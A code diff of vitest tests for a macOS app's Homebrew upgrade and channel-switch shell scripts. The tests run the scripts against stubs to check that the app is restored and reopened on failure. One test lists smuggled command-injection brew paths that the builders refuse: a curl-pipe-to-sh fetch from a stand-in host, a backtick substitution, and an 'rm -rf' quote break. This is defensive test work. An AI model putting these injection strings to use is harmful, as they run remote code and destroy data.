@@ -1,3 +1,6 @@
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import path from "node:path";
 import { describe, expect, it, vi } from "vitest";
 import {
   BETA_CASK_TOKEN,
@@ -17,6 +20,7 @@ import {
   type BrewRunner,
   type CaskToken,
 } from "./homebrew";
+import type * as NodeChildProcess from "node:child_process";
 
 /**
  * Real `node:child_process` exports are frozen ESM bindings — `vi.spyOn`
@@ -47,6 +51,99 @@ vi.mock("node:child_process", () => ({
   execSync: childProcessExecSyncMock,
   execFileSync: childProcessExecFileSyncMock,
 }));
+
+/**
+ * The helpers this module builds are shell scripts, and the thing that went
+ * wrong in them was REACHABILITY: `... || exit 1` aborts after the app has
+ * already quit, so the restore and the reopen below it never run. No index
+ * comparison over the emitted text can catch that — the strings are all
+ * present and in the right order; it is control flow that skips them. So
+ * these tests execute the real emitted script under `/bin/sh` against stub
+ * `brew`/`open`/`pgrep`/`sleep` binaries and read back the trace of what
+ * actually ran, with each brew step forced to fail in turn.
+ *
+ * `node:child_process` is module-mocked above, so `spawnSync` comes from the
+ * real module explicitly.
+ */
+const { spawnSync: realSpawnSync } =
+  await vi.importActual<typeof NodeChildProcess>("node:child_process");
+
+type HelperScriptRun = {
+  /** `<verb> <token>` per brew call, plus `open <flag> <target>`, in order. */
+  readonly trace: readonly string[];
+  readonly status: number;
+  readonly stderr: string;
+};
+
+/**
+ * @param failSteps `<verb>:<token>` fails every time; `<verb>:<token>#<n>`
+ *   fails only the nth call, which is how "first install fails, retry
+ *   succeeds" is expressed.
+ */
+const runHelperScript = (
+  buildScript: (brewBinary: string) => string,
+  failSteps: readonly string[] = [],
+): HelperScriptRun => {
+  const directory = mkdtempSync(path.join(tmpdir(), "fixlang-helper-"));
+  const stateDirectory = path.join(directory, "state");
+  mkdirSync(stateDirectory);
+  const tracePath = path.join(directory, "trace.log");
+
+  const writeStub = (name: string, body: string): string => {
+    const file = path.join(directory, name);
+    writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
+    return file;
+  };
+
+  const brewStub = writeStub(
+    "brew",
+    [
+      // argv is `<verb> --cask <token>` for every call this module emits.
+      'echo "brew $1 $3" >> "$TRACE"',
+      'key="$1:$3"',
+      "count=0",
+      '[ -f "$STATE/$key" ] && count=$(cat "$STATE/$key")',
+      "count=$((count + 1))",
+      'echo "$count" > "$STATE/$key"',
+      "for spec in $FAIL_STEPS; do",
+      '  case "$spec" in',
+      '    "$key"|"$key#$count") exit 1 ;;',
+      "  esac",
+      "done",
+      "exit 0",
+    ].join("\n"),
+  );
+  // `open`, `pgrep` and `sleep` are absolute paths in the emitted text on
+  // purpose (never resolved from PATH), so stubbing them means rewriting
+  // those exact literals. brew is a parameter, so it needs no rewriting.
+  const script = buildScript(brewStub)
+    .replaceAll("/usr/bin/open", writeStub("open", 'echo "open $1 $2" >> "$TRACE"'))
+    .replaceAll("/usr/bin/pgrep", writeStub("pgrep", "exit 1"))
+    .replaceAll("/bin/sleep", writeStub("sleep", "exit 0"));
+
+  const result = realSpawnSync("/bin/sh", ["-c", script], {
+    encoding: "utf8",
+    env: {
+      ...process.env,
+      TRACE: tracePath,
+      STATE: stateDirectory,
+      FAIL_STEPS: failSteps.join(" "),
+    },
+  });
+
+  return {
+    trace: existsSync(tracePath)
+      ? readFileSync(tracePath, "utf8")
+          .split("\n")
+          .filter((line) => line.length > 0)
+      : [],
+    status: result.status ?? -1,
+    stderr: result.stderr,
+  };
+};
+
+const APP_PATH = "/Applications/FixLang.app";
+const REOPENED = `open -a ${APP_PATH}`;
 
 const caskInfoJson = (version: string, token: string = STABLE_CASK_TOKEN): string =>
   JSON.stringify({ casks: [{ token, version }] });
@@ -188,6 +285,62 @@ describe("upgrade script", () => {
 
     expect(fallback).not.toContain("open -a \"");
     expect(fallback).toContain("/usr/bin/open -b com.fixlang.app");
+  });
+
+  /**
+   * REGRESSION: `upgrade --cask ... || exit 1` aborts AFTER the wait loop has
+   * confirmed the app is gone, so a failed upgrade used to leave the user
+   * with no running app and no explanation — the same shape the channel
+   * switch then re-authored three more times. Executing the script proves
+   * the reopen is reachable; no index comparison over the text can, because
+   * the reopen string is present either way.
+   */
+  it("reopens the app even when the upgrade itself fails", () => {
+    const { trace, status } = runHelperScript(
+      (brew) => buildUpgradeScript(brew, APP_PATH),
+      ["upgrade:fixlang"],
+    );
+
+    expect(trace).toEqual(["brew upgrade fixlang", REOPENED]);
+    expect(status).toBe(1);
+  });
+
+  it("reopens the app after a successful upgrade", () => {
+    expect(runHelperScript((brew) => buildUpgradeScript(brew, APP_PATH))).toMatchObject({
+      trace: ["brew upgrade fixlang", REOPENED],
+      status: 0,
+    });
+  });
+});
+
+/**
+ * Tokens and the bundle path are both refused at this boundary rather than
+ * trusted by provenance; the brew path was the one value that was not, even
+ * though it lands in the same `/bin/sh` text inside a detached helper that is
+ * already allowed to uninstall an application. Not reachable from today's
+ * callers (`findBrewBinary` returns one of two constants) — the point is that
+ * a caller resolving brew from `HOMEBREW_PREFIX` or `which` cannot make it
+ * reachable later.
+ */
+describe("refuses an unsafe brew path before it reaches the shell text", () => {
+  it.each([
+    "opt/homebrew/bin/brew",
+    "/opt/$(curl -s evil.example/x|sh)/bin/brew",
+    "/opt/`id`/bin/brew",
+    '/opt/homebrew/bin/brew"; rm -rf /tmp/x; "',
+    "/opt/home\\brew/bin/brew",
+    "/opt/homebrew/bin/\nbrew",
+  ])("refuses %s in both builders", (brewBinary) => {
+    expect(() => buildUpgradeScript(brewBinary)).toThrow(/unsafe brew path/);
+    expect(() =>
+      buildChannelSwitchScript(brewBinary, STABLE_CASK_TOKEN, BETA_CASK_TOKEN),
+    ).toThrow(/unsafe brew path/);
+  });
+
+  it("still accepts both real Homebrew prefixes", () => {
+    for (const candidate of BREW_BINARY_CANDIDATES) {
+      expect(() => buildUpgradeScript(candidate)).not.toThrow();
+    }
   });
 });
 
@@ -725,20 +878,31 @@ describe("channel switch script", () => {
    * allowing the token to be followed by `;`, a quote, or whitespace, since
    * the retry/restore commands sit inside `if ! "..." install ...; then`.
    */
+  const caskCommandPattern = (verb: string, token: string): RegExp =>
+    new RegExp(
+      `"${escapeRegExp(BREW)}" ${verb} --cask ${escapeRegExp(token)}(?![A-Za-z0-9@])`,
+      "g",
+    );
+
   const indexOfCaskCommand = (
     script: string,
     verb: string,
     token: string,
     fromIndex = 0,
   ): number => {
-    const pattern = new RegExp(
-      `"${escapeRegExp(BREW)}" ${verb} --cask ${escapeRegExp(token)}(?![A-Za-z0-9@])`,
-      "g",
-    );
+    const pattern = caskCommandPattern(verb, token);
     pattern.lastIndex = fromIndex;
     const match = pattern.exec(script);
     return match ? match.index : -1;
   };
+
+  /** Every occurrence, so a test can bound a count instead of only ordering. */
+  const indicesOfCaskCommand = (
+    script: string,
+    verb: string,
+    token: string,
+  ): readonly number[] =>
+    [...script.matchAll(caskCommandPattern(verb, token))].map((match) => match.index);
 
   const script = buildChannelSwitchScript(
     "/opt/homebrew/bin/brew",
@@ -761,7 +925,11 @@ describe("channel switch script", () => {
     STABLE_CASK_TOKEN,
     restoreSearchStart,
   );
-  const reopenIdx = script.lastIndexOf("/usr/bin/open -b com.fixlang.app");
+  const trapIdx = script.indexOf("trap reopen_fixlang EXIT");
+  const waitLoopEndIdx = script.indexOf("\ndone\n");
+
+  const switchScript = (brew: string): string =>
+    buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH);
 
   it("waits for the app to exit before touching either cask", () => {
     expect(pgrepIdx).toBeGreaterThanOrEqual(0);
@@ -791,9 +959,39 @@ describe("channel switch script", () => {
     expect(uninstallIdx).toBeLessThan(firstInstallIdx);
   });
 
+  /**
+   * REGRESSION: this test used to assert only that the second install came
+   * after the first, which is true of any number of attempts — inserting a
+   * THIRD attempt into the retry ladder left the whole file green. "Exactly
+   * once" is an upper bound, so it has to be asserted as a count: an
+   * unbounded ladder would stretch the window in which the user has no app
+   * installed, which is the failure this whole design is shaped around.
+   * Counted before the restore because the last-resort attempt AFTER a failed
+   * restore is not a retry of the switch — by then it is the only remaining
+   * way to leave the user with any app at all.
+   */
   it("retries the target install exactly once before giving up on it", () => {
     expect(firstInstallIdx).toBeGreaterThanOrEqual(0);
     expect(secondInstallIdx).toBeGreaterThan(firstInstallIdx);
+    expect(restoreIdx).toBeGreaterThan(secondInstallIdx);
+
+    const attemptsBeforeRestore = indicesOfCaskCommand(
+      script,
+      "install",
+      BETA_CASK_TOKEN,
+    ).filter((index) => index < restoreIdx);
+
+    expect(attemptsBeforeRestore).toEqual([firstInstallIdx, secondInstallIdx]);
+  });
+
+  it("makes exactly one last-resort target attempt after a failed restore", () => {
+    const attemptsAfterRestore = indicesOfCaskCommand(
+      script,
+      "install",
+      BETA_CASK_TOKEN,
+    ).filter((index) => index > restoreIdx);
+
+    expect(attemptsAfterRestore).toHaveLength(1);
   });
 
   /**
@@ -806,8 +1004,136 @@ describe("channel switch script", () => {
     expect(restoreIdx).toBeGreaterThan(secondInstallIdx);
   });
 
-  it("reopens the app after the restore step", () => {
-    expect(reopenIdx).toBeGreaterThan(restoreIdx);
+  /**
+   * REGRESSION: the test that used to sit here read
+   * `lastIndexOf("/usr/bin/open -b com.fixlang.app") > restoreIdx`, which
+   * always resolved to the trailing success-path reopen and so was true no
+   * matter what the restore branch contained — deleting the reopen from that
+   * branch left the whole file green. The reopen is now a single EXIT trap
+   * armed the moment the wait loop confirms the app is gone, which is the
+   * invariant stated once instead of per branch: below this line the app is
+   * off the user's screen, so every exit brings it back.
+   */
+  it("arms the reopen for every exit path the moment the app is gone", () => {
+    expect(trapIdx).toBeGreaterThan(waitLoopEndIdx);
+    expect(trapIdx).toBeLessThan(fetchIdx);
+    expect(script.match(/^trap /gm)).toHaveLength(1);
+    // The trap names a function, never inline text: a bundle path holding a
+    // quote would otherwise escape the trap's own quoting.
+    expect(script).toContain("reopen_fixlang() {");
+  });
+
+  /**
+   * The tests below execute the emitted script rather than index it, because
+   * the defect they pin is reachability: every string was already present and
+   * correctly ordered while the control flow skipped straight past it.
+   */
+  it("reopens the app it made quit when the target fetch fails", () => {
+    const { trace, status } = runHelperScript(switchScript, ["fetch:fixlang@beta"]);
+
+    // Nothing was uninstalled, so the user is exactly where they started —
+    // which includes still running the app.
+    expect(trace).toEqual(["brew fetch fixlang@beta", REOPENED]);
+    expect(status).toBe(1);
+  });
+
+  /**
+   * REGRESSION: `uninstall --cask <current> || exit 1` was the worst outcome
+   * this feature can produce — a cask uninstall that fails partway can
+   * already have removed the bundle, and the abort reached neither the
+   * restore nor the reopen, so the user was left with no app in
+   * /Applications and no indication why. Observed by executing the previous
+   * script with the uninstall forced to fail: the trace ended at
+   * `brew uninstall fixlang`.
+   */
+  it("reinstalls the current cask and reopens when the uninstall fails", () => {
+    const { trace, status, stderr } = runHelperScript(switchScript, ["uninstall:fixlang"]);
+
+    expect(trace).toEqual([
+      "brew fetch fixlang@beta",
+      "brew fetch fixlang",
+      "brew uninstall fixlang",
+      "brew install fixlang",
+      REOPENED,
+    ]);
+    expect(stderr).toContain("Failed to uninstall fixlang");
+    expect(status).toBe(1);
+  });
+
+  it("restores the original token and reopens when both target installs fail", () => {
+    const { trace, status } = runHelperScript(switchScript, ["install:fixlang@beta"]);
+
+    expect(trace).toEqual([
+      "brew fetch fixlang@beta",
+      "brew fetch fixlang",
+      "brew uninstall fixlang",
+      "brew install fixlang@beta",
+      "brew install fixlang@beta",
+      "brew install fixlang",
+      REOPENED,
+    ]);
+    expect(status).toBe(1);
+  });
+
+  /**
+   * Once the rollback itself has failed the user has NO app; at that point
+   * "on the channel they did not ask for" beats "none", and the target's DMG
+   * is the one still guaranteed to be in the download cache.
+   */
+  it("falls back to the target when the restore itself fails", () => {
+    const { trace, status } = runHelperScript(switchScript, [
+      "install:fixlang@beta#1",
+      "install:fixlang@beta#2",
+      "install:fixlang",
+    ]);
+
+    expect(trace.at(-2)).toBe("brew install fixlang@beta");
+    expect(trace.at(-1)).toBe(REOPENED);
+    expect(status).toBe(1);
+  });
+
+  /**
+   * REGRESSION: the restore was the only brew call in either builder with no
+   * status check. When it failed, the log's last app-authored line still read
+   * "restoring fixlang" — and there is no app left running to report through,
+   * so the helper log is the only channel there is.
+   */
+  it("names the one command that recovers the machine when nothing installs", () => {
+    const { stderr, status } = runHelperScript(switchScript, [
+      "install:fixlang@beta",
+      "install:fixlang",
+    ]);
+
+    expect(stderr).toContain("Failed to restore fixlang");
+    expect(stderr).toContain("brew install --cask fixlang");
+    expect(status).toBe(1);
+  });
+
+  it("pre-stages the rollback download but never blocks the switch on it", () => {
+    const { trace, status, stderr } = runHelperScript(switchScript, ["fetch:fixlang"]);
+
+    expect(trace).toEqual([
+      "brew fetch fixlang@beta",
+      "brew fetch fixlang",
+      "brew uninstall fixlang",
+      "brew install fixlang@beta",
+      REOPENED,
+    ]);
+    expect(stderr).toContain("Could not pre-stage the fixlang download");
+    expect(status).toBe(0);
+  });
+
+  it("switches and reopens with no brew step failing", () => {
+    expect(runHelperScript(switchScript)).toMatchObject({
+      trace: [
+        "brew fetch fixlang@beta",
+        "brew fetch fixlang",
+        "brew uninstall fixlang",
+        "brew install fixlang@beta",
+        REOPENED,
+      ],
+      status: 0,
+    });
   });
 
   it("never emits --zap or --force", () => {
